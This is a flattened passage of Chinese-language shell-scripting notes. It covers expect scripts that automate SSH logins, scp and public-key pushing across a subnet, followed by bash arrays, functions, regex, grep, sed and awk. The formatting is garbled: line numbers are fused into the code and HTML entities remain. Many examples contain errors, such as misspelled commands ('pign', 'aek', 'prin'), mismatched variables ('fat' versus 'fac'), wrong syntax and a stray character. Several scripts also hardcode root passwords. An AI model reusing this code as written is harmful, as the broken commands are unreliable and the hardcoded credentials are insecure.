];then echo "$ip is up." else echo "$ip is down." fi echo &gt;&amp;8 # 有借有还（借一个还一个，不能让文件描述符里面空） &#125;&amp;donewaitecho "执行结束. .."# 执行结果是5个5个出来的（因为定义的进程是5个） expect expect —-&gt; 不是shell，是一个新的语言 解决交互的繁琐操作 安装：apt install expect expect实现批量远程命令执行 1234# 如果for while，需要一步步的交互(比较麻烦)，但是可以使用公钥认证(ssh-keygen,ssh-copy-id)#第一步，实现了公钥认证# ps:如果登录的新的机器与之前的指纹不一样，先删除本地保存的信息# expect打前站，先把公钥推过去，后面再用别的实现 ssh初级例子1： 1234567891011121314#!/usr/bin/expectset ip 192.168.0.1set user rootset passwd 123456set timeout 5spawn ssh $user@$ipexpect &#123; #就是把接下来要出现的字符串等提前写好 "yes/no" &#123; send "yes\r"; exp_continue &#125; # 当出现什么，怎么处理(没出现就继续) "password:" &#123; send "$passwd\r" &#125;;&#125;interact #交互停在对方那边不退出来# 执行脚本: expect test.sh ssh初级例子2(升级版)： 123456789101112131415161718#!/usr/bin/expectset ip [lindex $argv 0] # 第一个位置参数(与shell的不通)set user [lindex $argv 1]set passwd 123456set timeout 5spawn ssh $user@$ipexpect &#123; #就是把接下来要出现的字符串等提前写好 "yes/no" &#123; send "yes\r"; exp_continue &#125; # 当出现什么，怎么处理(没出现就继续) "password:" &#123; send "$passwd\r" &#125;;&#125;#interact # 交互停在对方那边不退出来# 干点别的事情expect "#" # 不用大括号也可以#send "useradd xps\r"send "pwd\r"send "exit\r"expect eof # 结束expect 例子3：scp传递文件 1234567891011121314######## 升级版#!/usr/bin/expectset ip [lindex $argv 0] # 第一个位置参数(与shell的不通)set user [lindex $argv 1]set passwd 123456set timeout 5spawn scp -r /etc/xxx $user@$ip:/tmpexpect &#123; #就是把接下来要出现的字符串等提前写好 "yes/no" &#123; send "yes\r"; exp_continue &#125; # 当出现什么，怎么处理(没出现就继续) "password:" &#123; send "$passwd\r" &#125;;&#125;expect eof # 结束expect 例子4： 推公钥 123456789101112131415161718192021222324252627282930313233343536373839# shell与expect一起用#!/bin/bash&gt;ip.txtpasswd=123#测试expect有没有装(以centos为例)rpm -q expect &amp;/dev/nullif [ $? -ne 0 ];then yum -y install expectfi# 判断是否有公钥if [ ! -f ~/.ssh/id_rsa ];then ssh-keygen -P "123" -f ~/.ssh/id_rsa # 指定公钥的密码和位置fifor i in &#123;2..254&#125;do &#123; ip=192.168.0.$i pign -c1 -W1 $ip &amp;/dev/null if [ $? -eq 0 ];then echo "$ip" &gt;&gt; ip.txt # 开始expect /usr/bin/expect &lt;&lt;-EOF set timeout 10 spawn ssh-copy-id $ip # 推送公钥。 前面必须都是tab，不能有空格（:set list 查看是tab还是空格） expect &#123; "yse/no" &#123; send "yes\r"; exp_continue &#125; "password:" &#123; send "$passwd\r" &#125; &#125; expect eof EOF fi &#125;&amp;donewaitecho "finish..." 1234567891011121314151617# 上一个例子, 已经实现了公钥认证，后面的操作就可以使用shell了，基本不用expect了# 重启之后查看机器的ip，直接用get_ip.sh脚本（就不用了一个一个去看了）#!/bin/bash&gt;ping.txt# &#123;2..254&#125; 集合， 另一个序列: seq `2 254`for i in &#123;2..254&#125;do &#123; $ip = 192.168.111.$i ping -c1 -W1 $ip &amp;&gt;/dev/null if [ $? -eq 0 ]; then echo "$ip" | tee -a ping.txt fi &#125;&amp; 】donewait echo "finish !!!" 五.数组没有多维数组这个概念 定义 1.普通数组 1234567# 普通数组：只能使用整数作为数组索引books=(linux shell awk docker)books=(linux shell awk [20]=docker) # 索引20为docker# 从文件赋值books2=(`cat /etc/passwd`)books=(`ls /etc/`)# 中间值可以跳过 2.关联数组 123# 关联数组：可以使用字符串作为数组索引（相当于字典）declare -A info # 先声明是关联数组info ([name]=xps [sex]=male [age]=20 [skill]=security) # 赋值 使用 1234567891011121314151617181920echo $&#123;books[3]&#125;echo $&#123;info[name]&#125;# 查看所有的数组declare -a# 查看所有的关联数组declare -A# 获取数组元素的索引号echo $&#123;info[@:1]&#125; # 从数组下标1开始echo $&#123;info[@:1:2]&#125; # 从数组下标1开始，访问两个元素# 获取所有的索引keyecho $&#123;!info[@]&#125;# 统计元素个数echo $&#123;#info[@]&#125;# 数组中所有元数（等同于： $&#123;info[*]&#125; ）echo $&#123;info[@]&#125; 遍历 1.按照个数遍历 2.按照索引遍历 例子: 123456789101112131415161718192021222324252627282930#while方式i=0while read linedo hosts[++i]=$line #hosts是个数组done &lt;/etc/hostsfor j in $&#123;!hosts[@]&#125;do echo "$i: $&#123;hosts[i]&#125;"done########################################################################3# for方式 不是以换行分割（按照空格,tab等分割）OLD_IFS=$IFSIFS=$'\n' # 解决for i in $&#123;!hosts[@]&#125;do echo "$i: $&#123;hosts[i]&#125;"donefor j in $&#123;!hosts[@]&#125;do echo "$i: $&#123;hosts[i]&#125;"doneIFS=$OLD_IFS # 不是全文都要，如果后门想用回车作为分隔符号 实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/bin/bash## 1. 性别次数统计## 其实用awk一行搞定awk '&#123;print $2&#125;' sex.txt |sort |uniq -c## 这里还是先学基础的（`把要统计的对象作为数组的索引` ，首先是关联数组）#!/bin/bashdeclare -A sexwhile read linedo # 里面的第二列（m/f） type=`echo $line |awk '&#123;print $2&#125;'` let sex[$type]++ # sex[m]++ 性别的数量增加 done &lt; sex.txt# 遍历(通过索引)for i in $&#123;!sex[@]&#125; # 获取所有的索引keydo echo "$i: $&#123;sex[$i]&#125;" #变量尽量加$done### 2. 统计不同类型shell的数量# /etc/passwd中#!/bin/bashdeclare -A shells # 先定义关联数组while read linedo # 里面的第二列 type=`echo $line |awk -F":" '&#123;print $7&#125;'` #按照冒号分割 &#123;print $NF&#125;最后一列 let shells[$type]++ # sex[m]++ 性别的数量增加 done &lt; /etc/passwd#输出for i in $&#123;!shells[@]&#125;do echo "$i: $&#123;shells[$i]&#125;" # /bin/bash : 5done### 这是awk的强项awk -F":" '&#123;print $NF&#125;' /etc/passwd |sort |uniq -c## 3. 统计tcp连接状态数量#ss -an |grep 80#!/bin/bashwhile :do unset status # 取消， 重新声明 declare -A status # 先定义关联数组 type=`ss -an |grep :80 |aek '&#123;print $2&#125;'` # 要统计的(是一个arr) for i in $type do let status[$i]++ done #输出 for i in $&#123;!status[@]&#125; do echo "$i: $&#123;status[$i]&#125;" # SYN-SENT: 5 done sleep 1 cleardone# 思想: 把要统计的对象最为索引，一直累加## 拓展：## 一.如果想一直看# 1. watch -n2 test.sh # 每几秒看一次# 2. 脚本里面while循环(更麻烦)## 二.vim部分复制粘贴： # ^V 块选择，然后按y复制， 最后找到地方p粘贴 六.函数定义 123456789# F1:函数名()&#123; 功能&#125;# F2:funcion 函数名&#123; 功能&#125; 调用 调用1 1234567891011#例子：阶乘#!/bin/env bashfactorial()&#123;fat=1for((i=1;i&lt;=50;i++))do fac=$[$fac*$i]doneecho "5的阶乘:$fac"&#125;factorial # 调用 调用2 1234567891011#!/bin/env bashfactorial()&#123;fat=1for((i=1;i&lt;=$num;i++))do fac=$[$fac*$i]doneecho "$num的阶乘:$fac"&#125;num=5 # 调用之前先定义变量factorial 调用3 1234567891011#!/bin/env bashfactorial()&#123;fat=1for i in `seq $1`do let fac*=$idoneecho "$1的阶乘:$fac"&#125;factorial $1 # 位置变量，调用 调用4 12# 如果函数再另一个文件里面，先执行一下，后面再调用./f1.sh 返回值 12345678910#!/bin/env bashfun2()&#123; read -p "enter a number:" num let 2*$num return $[2*$num]&#125;fun2echo "funcion return value: %?" # 上一个命令的返回值（函数值最后一条命令的返回的状态码）echo "funcion return: $?" # 函数的返回值(也可以自定义，但是默认shell返回码,最大不能超过255) 如果想返回字符串等: 函数的输出 12345678#!/bin/env bashfun2()&#123; read -p "enter a number:" num echo $[2*$num] # echo &#125;result=`fun2` # 使用函数的输出echo "return_out value: $result" 参数的传递 1.位置参数 12345678910111213#!/bin/env bashif [ $# -ne 3 ];then # 如果参数不是三个 echo "Usage: `basename $0`par1 par2 par3 " exitfifunction parm_func()&#123; echo "$(($1 * $2 * s3))"&#125;result=`parm_func $1 $2 $3` # 分清：程序的位置参数，函数的位置参数echo "result is: $result" 2.数组 1234567891011121314151617181920#!/bin/env bashnum=(1,2,3,4,5)#echo "$&#123;num[@]&#125;" #打印所有元素arr_parm() &#123; local fa=1 ## 局部变量，只在函数内部生效 for i in "$@" #for i in $* do let fa*=$i done echo "$fa"&#125;#arr_parm $&#123;num[@]&#125;arr_parm $&#123;num[*]&#125; # 数组所有 元素值# 拓展：# for i in $* # 所有参数# for i 传数组到函数中 –&gt; 运算 –&gt; 输出数组形式 12345678910111213141516#!/bin/env bashnum=(1,2,3,4,5)array() &#123; #echo "所有参数: $*" local new_arr=(`echo $*`) #local new_arr=($*) local i for ((i=0;i&lt;$#;i++)) do out_arr[$i]=$[ $&#123;[$i]&#125;*5 ] done echo "$&#123;out_arr[*]&#125;"&#125;result=`array$&#123;num[*]&#125;`echo $&#123;result[*]&#125; 123456789101112131415161718#!/bin/env bashnum=(1,2,3,4,5)array() &#123; local i local new_arr=() for i in $* do new_arr[j++]=$[$i*5] done echo "$&#123;new_arr[*]&#125;"&#125;result=`array$&#123;num[*]&#125;`echo $&#123;result[*]&#125;# 函数接收位置参数 $1 $2 $3# 函数接收数组参数 $* 或 $@#函数将接收到的所有参数赋值给数组 new_arr=($*) 七.正则大多数程序中，正则表达式被放在两个正斜杠之间, 比如：/L[oO]ve/ 入门小例子 123456789# 简单实例（不严谨的例子，我们写shell脚本没必要写那么复杂，我们的脚本是给自己用的多）匹配数字： ^[0-9]+$匹配Email： [a-z0-9_]+@[a-z0-9]+\.匹配IP： [0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125; 或者 [[:digit:]]&#123;1,3&#125;\.[[:digit:]]&#123;1,3&#125;\.[[:digit:]]&#123;1,3&#125;\.[[:digit:]&#123;1,3&#125;# egrep '[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;' /etc/sysconfig/network-scripts/ifcfg-eth0 正则 元字符 注意和shell的元字符是不太一样的 12345678910111213# 由执行模式匹配的操作的程序来解析，比如vi，grep，sed，awk，python# 只要不是shell，就是正则的元字符rm -rf *.pdf # shell中的*， 匹配任意grep 'c*' /etc/passwd # c出现0次或者多次egrep 'c+' /etc/passwd # +要使用egrep或反斜杠vim中替换： `:%s/\&lt;[tT]om\&gt;/TOM/g` # 尖括号括起来的是单词## 例子：grep "sh$" /etc/passwdgrep "ro*t" /etc/passwdgrep "^[rot]" /etc/passwd # 以r或o或t开头的 1.基本元字符 123456789101112131415161718192021^ 行首定位符 ^love$ 行位定位符 love$. 匹配单个字符 l..e* 匹配前导符0到多次 ab*love.* 任意多个字符 [] 匹配指定范围内的一个字符 [lL]ove[-] 匹配指定范围内的一个字符 [a-z0-9]ove[^] 匹配不再指定组内的一个字符 [^a-z0-9]ove\ 用来转义元字符 love\.\&lt; 词首定位符 \&lt;love\&gt; 词尾定位符 love\&gt;\(..\) 匹配稍后使用的字符的标签 :%s/172.16.130.1/172.16.130.5/ :%s/\(172.16.130.\)1/\15/ :%s/\(172.\)\(16.\)\(130.\)1/\1\2\35/ :3,9s/\(.*\)/#\1/ # 把第3-9行整行注释掉# 大括号每一半前面要加斜线记得x\&#123;m\&#125; 字符x重复出现m次 o\&#123;5\&#125;x\&#123;m,\&#125; 字符x重复出现m次以上 o\&#123;5,\&#125;x\&#123;m,n\&#125; 字符x重复出现m次 o\&#123;5,10\&#125; 2.拓展正则表达式元字符 123456789+ 匹配一个或多个前导字符 [a-z]+ove? 匹配零个或一个前导字符 lo?ve # o出现0次或1次 ss -an |egrep ':80:22\&gt;'a|b 匹配a或b love|hate() 组 字符 loveablle|rs love(able|rs)ov+ (ov)+ ov+ # 里面内容作为一个整体(..)(..)\1\2 标签匹配字符 (love)able\1er # 不带斜线x&#123;m&#125; 字符x重复出现m次 o&#123;5&#125;x&#123;m,&#125; 字符x重复至少m次 o&#123;5,&#125;x&#123;m,n&#125; 字符x重复m到n次 o&#123;5,10&#125; 3.POSIX字符类 （类似于shell中环境变量，已经定义好的） 12345678[:alnum:] 字母与数字字符 [[:alnum:]]+ # 外面的方括号是包里面的[:alpha:] 字母字符（包括大小写字母） [[:alpha:]]&#123;4&#125;[:blank:] 空格与制表符 [[:blank:]]*[:digit:] 数字 [[:digit:]]?[:lower:] 小写字母 [[:lower:]]&#123;5,&#125;[:upper:] 大写字母 [[:upper:]]+[:punct:] 标点符号 [[:punct:]][:space:] 包括换行符、回撤等在内的所有空白 [[:space:]]+ 带括号与不带括号： 正则匹配实例：vim中查找替换 1234567# 空行：/^$//^[\t]*$/# 注释行：/^#//^[\t]*#/ grep grep 文件中查找指定的正则表达式 egrep 拓展的egrep，支持更多的正则表达式元字符 fgrep 固定grep(fixed grep),有时也被称作快速(fast grep), 它按字面解释所有的字符 12345678910111213#过滤（尽量加引号）grep [选项] PATTERN 文件 文件 文件grep -q "root" /etc/passwd : echo $?# 返回值：# 0 找到# 1 没找到# 2 找不到指定文件# grep的输入可以来自：文件、标准输入、管道ss -an |grep ":22$"ll |grep '^d' # 找出目录 使用的元字符 123456789101112grep： 使用基本元字符集 ^, $, ., *, [], [^], \&lt;\&gt;, \(\), \&#123;\&#125;, \+, egrep： 使用扩展元字符集 ?, +, &#123;&#125;, |, ()#Note: grep也可以使用扩展元字符集，仅需再这些元字符前置一个反斜线(尖号不行)\w 所有字母与数字，称之为字符，即 [a-zA-Z0-9]\W 与上面相反，非字符 [^a-zA-Z0-9]\b 词边界# grep -E 或 egrep grep选项 12345678910111213141516-v 取反，只显示不匹配的-i 忽略大小写-l 只列出匹配行所在的文件名(哪些文件里面有这些匹配)-n 再每一行前面加上他所在文件中的相对行号-c 显示成功匹配的行数-s 禁止显示文件不存在或文件不可读的错误信息-q 静默--color 颜色-R, -r 递归针对目录-o 只显示匹配的内容-B 前几行 grep -C2 'root' /etc/passwd -A 后几行-C 上下几行nmap --help |grep '\-u' # 查看帮助文档里的-u 八.sedsed: 流编辑器，在线的、非交互式的编辑器（而vi是交互式的） sed工作流程 文本文件 -&gt; sed的模式空间(缓冲区) –&gt; 输出 命令格式 12#sed [options] 'cmd' file(s)sed [options] -f scriptfile file(s) sed不管是够找到指定的模式，他的退出状态都是0。 只有当命令语法存在错误时候，才是非0 可以在命令行，也可以在脚本里面使用 123sed 'd' /etc/test # d 删除sed '4d' /etc/test # 4d 删除第四行# i 修改文件(不是输出到屏幕上) 支持正则表达式 支持的元字符 12# 基本元字符集: ^, $, ., *, [], [^], \&lt;\&gt;, \(\), \&#123;\&#125; # 扩展元字符集: ?, +, &#123;&#125;, |, () 使用扩展元字符的方式 1234sed --help|grep '\-r' # \+ sed -r 基本用法： 123456789101112131415sed -r '' /etc/test # '' 没任何动作sed -r 'd' /etc/test sed -r 'p' /etc/test # p 打印sed -r -n 'p' /etc/test sed -r -n '/root/p' /etc/test # -n 静默方式# 上面四种不建议用(打印这种事情用不着sed，有别的打印就行)### 下面的功能才重点学sed -r 's/root/xps' /etc/test # 所有行查找替换,root换成大小写（只替换一次）sed -r 's/root/xps/g' /etc/test # g 全局sed -r 's/root/xps/gi' /etc/test # i 忽略大小写sed -r '/root/d' /etc/test # 没有s就是查找， 查找带root的行，然后删除sed -r '\#root#d' /etc/test # 查找：可以使用#等符号--&gt;不一定要斜线，但是前面要加\转义；查找替换:不用转义 地址(定址) 1234567891011121314151617181920212223#!/bin/bash# 用于决定对哪些行进行编辑。地址形式可以是数字、正则或二者的结合(如果没有指定,sed将处理输入文件中的所有行)sed -r 'd' /etc/test sed -r '3d' /etc/test sed -r '1,3d' /etc/test sed -r '/root/d' /etc/test # 删除root的行sed -r 'root/,5d' /etc/test # 从root行开始，到第5行删除sed -r 's/root/xps/g' /etc/test # 替换sed -r '/^adm/,20d' /etc/test # 从adm开头的那一行，删除到第20行sed -r '/^adm/,+20d' /etc/test # 从adm开头的那一行，再往后删除20行sed -r '/2,5d' /etc/test # 第二行到第五行 sed -r '/root/d' /etc/test # 带root的行删除sed -r '/root/!d' /etc/test # 除了root行以外都删除sed -r '1~2d' /etc/test # 删除所有奇数行(从1开始，每隔两行删)sed -r '0~2d' /etc/test # 删除所有偶数行# 拓展：vim中： 使用 `:r /etc/passwd` 来读取文件内容 命令 1234567891011121314151617181920212223242526# 告诉sed对指定行进行何种操作a 在当前行后添加一行或多行c 用新文本修改(替换)当前行中的文本d 删除行i 在当前行前插入文本l 列出非打印字符p 打印行 n 读入下一输入行，并从下一条命令而不是第一条命令开始对其的处理q 结束或退出sed! 取反(对所选行以外的所有行应用)s 用一个字符串替换另一个 s 替换标志 g 在行内进行全局替换 i 忽略大小写r 从文件中读w 将行写入文件y 将字符转换为另一个字符（不支持正则）h 把模式空间里的内容复制到暂存缓冲区(覆盖)H 把模式空间里的内容支架到暂存缓冲区中g 取出暂存缓冲区中的内容，将其复制到模式空间，覆盖该处原有内容G 取出暂存缓冲区中的内容，将其复制到模式空间，追加在原有内容后门x 交换暂存缓冲区域模式空间的内容 例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051## 例子# d 删除sed -r '3d' datefile # 删除第三行sed -r '3d' datefilesed -r '3&#123;d;&#125;' datefilesed -r '3d&#123;h:d&#125;' datefile # 先保存，再删除sed -r '3,$d' datefile # 删除3到最后一行sed -r '$d' datefile # 删除最后一行sed -r '/nrth/d' datefile # 删除满足这个匹配的行# s 替换 sed -r 's/west/north/g' datefilesed -r 's/^west/north/' datefile sed -r 's[0-9][0-9]$/&amp;.5' datefile # &amp;代表在查找串中匹配到的内容 # 拓展vim中在某行的后门加上xxx： :3,5s/.*/&amp;XXX/g#vim拓展1: :%s/.*/#&amp;/g 在所有行前面加注释#vim拓展1: :3,5s/~/#&amp;/ 和sed是一样的sed -r '%s/(.)(.)(.*)/\1xxx\2\3/' passwd # 把每行第二个字符前面加xxxsed -r 's/(Mar)got/\1inane/g' datefile# r 读文件sed -r 's/Suan/r /etc/newfile' datefile # 到Suan这一行的时候，读入一个新文件sed -r '2r /etc/hosts' a.txt # 处理到第二行的时候，读入一个新文件sed -r '/2r /etc/hosts' a.txt # /2 带有2的时候，读入...# w 写文件sed -r '/north/w newfile' datafile # 把north的行保存到新文件中去sed -r '3,$w /new.txt' datafile # 第三行到最后一行，保存...# a 追加sed -r '/root/a 1111111' datafile # 有root的行，就在后面添加11111sed -r '2a/ 1111111' datafile # 第二行，添加 111111111# i 在前面插入sed -r '/root/i 1111111' datafile # 有root的行，就在前面添加11111sed -r '2i/ 1111111' datafile # 第二行，在前面添加 111111111# c 修改替换sed -r '2c/ 1111111' datafile # 第二行，替换为 111111111# n 获取下一行命令sed -r '/eastern/&#123;n; d&#125;' datafile # 这行没有明显标志，用上面明显的隔山打牛# G g H h 暂存和取用命令sed -r '1h;$G' /etc/hosts # 处理到第一行时候，暂存；到最后一行，取过来 （第一行复制到最后一行）sed -r '1&#123;h;d&#125;;$G' /etc/hosts # 第一行移动到最后一行sed -r '1h;2,$G' /etc/hosts # 处理到第一行时候，暂存;到第二行和最后一行，取过来 模式空间/暂存空间 1234567891011## 小写是覆盖，大写是追加模式空间 h H --&gt; 暂存空间模式空间 &lt;--- g G 暂存空间 sed -r 'G;G' /etc/hosts # 所有行sed -r 'g;g' /etc/hosts # 暂存空间个模式空间互相转换命令 xsed -r '4h; 5x; 6G' /etc/hosts # 处理到第四行覆盖到暂存空间，到第五行:。。。 反向选择 12sed -r '3d' /etc/hostssed -r '3!d' /etc/hosts 多重编辑选项 1234# -esed -r -e '1,3d' -e 's/java/python/' datafile # 第一行到第三行删除，后面的替换覆盖sed -r '2&#123;s/java/python/g; s/php/go/g&#125;' datafile # 一行里面替换两次 常见操作 1234567891011121314151617181920212223242526272829303132333435363738############ 常见操作# 删除#注释行sed -ri '/^#/d' file.conf # 这种情况必须是第一个就是注释符sed -ri '/^[\t]*#/d' file.conf # 如果是前面有空格或tab然后才是注释符# 删除//注释行sed -ri '\Y/^[\t]*//Yd' file.conf # 删除无内容空行sed -ri '/^[\t]*$/d' file.conf # 删除注释行及空行sed -ri '/^[\t]*#|^[\t]*$/d' file.conf sed -ri '/^[\t]*(#|$)/d' file.conf # #加注释（vim是一样是）:%s/.*/#&amp;/g 在所有行前面加注释:3,5s/^/#&amp;/ 和sed是一样的sed -r '1,5s/^/#/' c.txtsed -r '3,$ s/^#*/#/' c.txt # 将行首0到多个井换成一个井# 如果井前有空格或tab等sed -r '3,$ s/^[\t]*#*/#/' c.txt # sed使用外部变量(使用双引号)var1=111sed -ri "3a$val1" /etd/hostssed -ri '$a'"$val1" /etd/hosts # 第一个单引号是`最后一行`，第二个里面是变量sed -ri "\$a$val1" /etd/hosts # 把$a转义一下也行cat a.txttac a.txt # 从后往前倒序（ sed -r '1!G; $!d' a.txt 推导一下弄明白 ） 九.awk awk本身也是一种编程语言（ps:我们使用的不是纯粹的awk，而是gawk） sed是修改文件 awk是用来统计 语法格式 awk [options] &#39;cmd&#39; filenames options 选项 -F 指定分隔符，默认是空格或tab command 123456789# BEGIN&#123;&#125; 行处理前# &#123;&#125; 行处理（有几行就处理几次）# END 行处理后awk 'BEGIN&#123;print 1/2&#125; &#123;print "ok"&#125;END&#123;print "------"&#125;' /etc/hosts# BEGIN&#123;&#125; 通常用于定义一些变量，比如: BEGIN&#123;FS=":";OFS="---"&#125; # OFS 输出时候的字段分隔符awk 'BEGIN&#123;FS=":"&#125; &#123;print $1&#125;' passwd # 在处理之前，(FS)就指定了分隔符 awk命令格式 123456789101112# awk 'pattern' filename awk '/root/' /etc/passwd# awk '&#123;action&#125;' filename awk -F: '&#123;print $3&#125;' /etc/passwd# awk 'pattern &#123;action&#125;' filename awk -F":" '/root/&#123;print $3&#125;' /etc/passwd awk 'BEGIN&#123;FS=":"&#125; /root/&#123;print $3&#125;' /etc/passwd# command |awk 'pattern &#123;action&#125;' df -P |grep '/' |awk '$4'&gt;25000 &#123;print $4&#125; # 除去第一行，如果大于25000就打印第四列 awk工作原理 记录与字段相关的内部变量 12345678910111213141516171819202122232425## 可以通过 man awk 查看# $0 awk变量保存当前记录的内容awk -F":" '&#123;print $0&#125;' /etc/passwd # NR 输入记录总的编号，显示行号awk -F":" '&#123;print NR,$0&#125;' /etc/passwd # FNR 当前记录文件的编号(处理多个文件，每个文件重新开始编号)awk -F":" '&#123;print FNR,$0&#125;' /etc/passwd /etc/passwd # NF: 保存记录的字段数(这一行一共有多少字段), $NF代表最后一个字段awk -F":" '&#123;print $0,NF,$NF&#125;' /etc/passwd # FS 输入字段分隔符，默认空格或tabawk 'BEGIN&#123;FS=":"&#125; &#123;print $0&#125;' /etc/passwd awk -F'[:\t]' '&#123;print $0,NF,$NF&#125;' /etc/passwd# OFS 输入字段分隔符，默认空格, OFS:输出分隔符awk 'BEGIN&#123;FS=":";OFS="+++"&#125; &#123;print $0&#125;' /etc/passwd # RS --记录分隔符(区分与FS字段分隔符) 默认换行符awk 'BEGIN&#123;RS=":"&#125; &#123;print $0&#125;' /etc/passwd # ORS awk 'BEGIN&#123;ORS=":"&#125; &#123;print $0&#125;' /etc/passwd # 将文件每一行合并为一行（ORS 输出记录分隔符）awk 'BEGIN&#123;ORS=""&#125; &#123;print $0&#125;' /etc/passwd 格式化输出 123456# 1.print# 2.printf 可以格式化（默认没有换行，手动加\n）date |awk '&#123;print "Month:" $2"\nYear: " $NF&#125;' # 只要不是变量，就要放到双引号里面# %s 字符串（-15s 15个字符，左对齐） %f 浮点型， %d数值类型awk -F: '&#123;printf "%-15s %-10s %-15s\n", $1,$2,$3&#125;' /etc/passwd awk模式和动作 模式：条件语句，复合语句，正则表达式。 包括两个特殊字典：BEGIN和END 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647### 模式可以是======= 正则表达式# 匹配记录（整行）awk '/^xps/' /etc/passwd # awk '$0 ~ /^xps/' /etc/passwd # ~ 匹配awk '!/xps/' /etc/passwd # awk '$0 !~ /^xps/' /etc/passwd# 匹配字段：匹配操作符(~!~)awk -F: '$1 ~ /^xps/' /etc/passwd # awk -F: '$NF !~ /^bash$/' /etc/passwd # 最后一列不是以bash结尾的======= 比较表达式# 用于比较 数字 与 字符串# &gt; &lt; == awk -F: '$3 == 0' /etc/passwdawk -F: '$3 == "/xps/"' /etc/passwd # == 全部等于awk -F: '$3 ~ /xps/' /etc/passwd # 正则匹配awk -F: '$NF ~ /xps/' /etc/passwd======= 条件表达式awk -F: '$3&gt;200&#123;print $0&#125;' /etc/passwd # $3大于200的，$0awk -F: '&#123; if($3&gt;200) &#123;print $0&#125; &#125;' /etc/passwd # 推荐这么写 &#123; if()&#123;cmd1;cmd2&#125; else&#123;&#125; &#125;awk -F: '&#123; if($3&gt;200) &#123;print $0&#125; else&#123;print $1&#125; &#125;' /etc/passwd ======= 算数运算#awk都按浮点数方式执行算数运算awk -F: '$3 * 10 &gt; 500' /etc/passwd awk -F: '&#123; if($3*10&gt;500)&#123;print $0&#125; &#125;' /etc/passwd # 如果$3*10&gt;500，就...======= 逻辑操作符和复合模式&amp;&amp; 逻辑与 || 逻辑或！ 逻辑非awk -F: '$1~/root/ &amp;&amp; $3&lt;=15' /etc/passwdawk -F: '$1~/root/ || $3&lt;=15' /etc/passwdawk -F: '!($1~/root/ &amp;&amp; $3&lt;=15)' /etc/passwd======= 范围模式awk '/Tom,/Susan/' filename awk脚本编程 12345678910111213141516171819202122232425262728293031323334353637383940### awk脚本编程====== 条件编程awk -F":" '&#123;if()&#123;&#125; else if()&#123;&#125; else&#123;&#125;&#125;' passwdawk -F":" '&#123;if($3&gt;0 &amp;&amp; $3&lt;1000)&#123;count++&#125;&#125; END&#123;print count&#125;' /etc/passwd # 统计系统用户数awk -F":" '&#123;if($3==0)&#123;count++&#125;&#125; else&#123;i++&#125; END&#123;print "管理员个数："count; print "系统用户个数:"i&#125;' /etc/passwd awk -F":" '&#123;if($3==0)&#123;i++&#125;&#125; else if($3&lt;999)&#123;j++&#125; else&#123;k++&#125; END&#123;print "管理员个数："i; print "普通用户个数:"j; print "系统用户个数:"k&#125;' /etc/passwd ====== 循环# 1.while 依此打印每一列awk -F":" '&#123;i=1;while(i&lt;7)&#123;print $i;i++&#125;&#125;' /etc/passwd awk -F":" '/^root/&#123;i=1;while(i&lt;7)&#123;print $i;i++&#125;&#125;' /etc/passwd awk -F":" '&#123;i=1;while(i&lt;=NF)&#123;print $i;i++&#125;&#125;' /etc/passwd awk '&#123;i=1;while(i&lt;=NF)&#123;print $i;i++&#125;&#125;' a.txt # 打印文件所有内容(默认是空格和tab分割)# 2.forawk 'BEGIN&#123;for(i=1;i&lt;=5;i++)&#123;prin i&#125;&#125;' # c风格的awk -F: '&#123;for(i=1;i&lt;=NF;i++)&#123;prin $i&#125;&#125;' passwdawk -F: '&#123;for(i=1;i&lt;=NF;i++)&#123;prin $0&#125;&#125;' passwd # 将每行打印10次====== 数组 (用来统计)awk -F: '&#123;username[++i]=$1&#125; END&#123;print username[1]&#125;' /etc/passwdawk -F: '&#123;username[i++]=$1&#125; END&#123;print username[1]&#125;' /etc/passwdawk -F: '&#123;username[i++]=$1&#125; END&#123;print username[0]&#125;' /etc/passwd## 数组遍历(主要用按索引遍历)# username数组名， 先保存到数组中，再进行遍历awk -F: '&#123;username[i++]=$1&#125; END&#123;for(i in username) &#123;print i,username[i]&#125;&#125;' /etc/passwd awk -F: '&#123;username[++i]=$1&#125; END&#123;for(i in username) &#123;print i,username[i]&#125;&#125;' /etc/passwd 基本练习 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172###### 基本练习### 1. 统计/etc/passwd 中各种shell的数量# # 把要统计的对象作为数组的索引(这里是最后一个$NF,也就是shell的类型)awk -F: '&#123;shells[$NF]++&#125; END&#123;for(i in shells)&#123;print i,shells[i]&#125;&#125;' /etc/passwd ### 2.网站访问状态统计netstat -ant |grep :80 |awk '&#123;access_stat[$NF]++&#125; END&#123;for(i in access_stat)&#123;print i,access_stat[i]&#125;&#125;' netstat -ant |grep :80 |awk '&#123;access_stat[$NF]++&#125; END&#123;for(i in access_stat)&#123;print i,access_stat[i]&#125;&#125;' |sort -k2 -n |headss -ant |grep :80 |awk '&#123;access_stat[$2]++&#125; END&#123;for(i in access_stat)&#123;print i,access_stat[i]&#125;&#125;' ### 3.统计当前访问的每个IP的数量 &lt;当前实时状态 netstat, ss&gt;netstat -ant |grep :80 |awk -F: '&#123;ip_count[$8]++&#125; END&#123;for(i in ip_count)&#123;print i,ip_count[i]&#125;&#125;' # 下面这个有点复杂了，不推荐用ss -ant |grep :80 |awk -F: '!/LISTEN/&#123;ip_count[$(NF-1)]++&#125; END&#123;for(i in ip_count)&#123;print i,ip_count[i]&#125;&#125;' |sort 0k2 -rn |head 5### 4.统计Apache/Nginx日志中某一天的PV量 &lt;统计日志&gt;grep '07/Aug/2019' access.log |wc -l # wc -l 统计行数### 4.统计Apache/Nginx日志中某一天不通IP的PV量 &lt;统计日志&gt;grep '07/Aug/2019' access.log |awk '&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;print i, ips[i]&#125;&#125;' |sort -k2 -rn | headawk '/22/\Mar\/2019/&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;print i, ips[i]&#125;&#125;'# &gt;100的才打印（此方法有点low，可用下面的几种方法）awk '/22/\Mar\/2019/&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;print i, ips[i]&#125;&#125;' | awk '$2&gt;100' |sort -k2 -rn | head awk 